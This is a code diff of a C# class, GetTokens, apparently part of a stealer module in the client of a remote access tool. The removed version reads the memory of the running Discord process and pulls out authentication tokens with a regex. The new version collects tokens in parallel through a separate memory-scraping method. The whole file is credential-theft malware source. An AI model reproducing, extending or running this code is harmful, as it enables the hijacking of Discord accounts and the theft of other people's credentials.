@@ -1,88 +1,42 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using System.Collections.Generic;
+using Quasar.Client.Kematian.Discord.Methods.Memory;
 
 namespace Quasar.Client.Kematian.Discord
 {
     public class GetTokens
     {
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesRead);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool CloseHandle(IntPtr hObject);
-
-        private const int PROCESS_VM_READ = 0x0010;
-        private const int PROCESS_QUERY_INFORMATION = 0x0400;
-
-        private static readonly Regex TokenRegex = new Regex(@"^(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})$", RegexOptions.Compiled | RegexOptions.IgnoreCase);
-
-        public List<string> ScanDiscordTokens()
+        public static string[] Tokens()
         {
             var tokens = new List<string>();
 
-            try
+            var methods = new List<Func<string[]>>()
             {
-                var discordProcesses = Process.GetProcessesByName("discord");
-                if (discordProcesses.Length == 0)
-                {
-                    Console.WriteLine("Discord.exe not found.");
-                    return tokens;
-                }
+                GetTokensFromMemory.Tokens,
+            };
 
-                var process = discordProcesses[0];
-                IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);
-
-                if (processHandle == IntPtr.Zero)
+            Parallel.ForEach(methods, method =>
+            {
+                try
                 {
-                    Console.WriteLine("Failed to open process.");
-                    return tokens;
-                }
-
-                foreach (ProcessModule module in process.Modules)
-                {
-                    try
+                    var result = method();
+                    if (result != null)
                     {
-                        tokens.AddRange(ScanModuleForTokens(processHandle, module));
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine($"Error scanning module {module.ModuleName}: {ex.Message}");
+                        lock (tokens)
+                        {
+                            tokens.AddRange(result);
+                        }
                     }
                 }
-
-                CloseHandle(processHandle);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error: {ex.Message}");
-            }
-
-            return tokens;
-        }
-
-        private IEnumerable<string> ScanModuleForTokens(IntPtr processHandle, ProcessModule module)
-        {
-            var tokens = new List<string>();
-            byte[] buffer = new byte[module.ModuleMemorySize];
-            IntPtr bytesRead;
-
-            if (ReadProcessMemory(processHandle, module.BaseAddress, buffer, (uint)module.ModuleMemorySize, out bytesRead))
-            {
-                string moduleContent = Encoding.UTF8.GetString(buffer);
-                foreach (Match match in TokenRegex.Matches(moduleContent))
+                catch (Exception ex)
                 {
-                    tokens.Add(match.Value);
+                    Debug.WriteLine(ex);
                 }
-            }
+            });
 
-            return tokens;
+            return tokens.ToArray();
         }
     }
 }
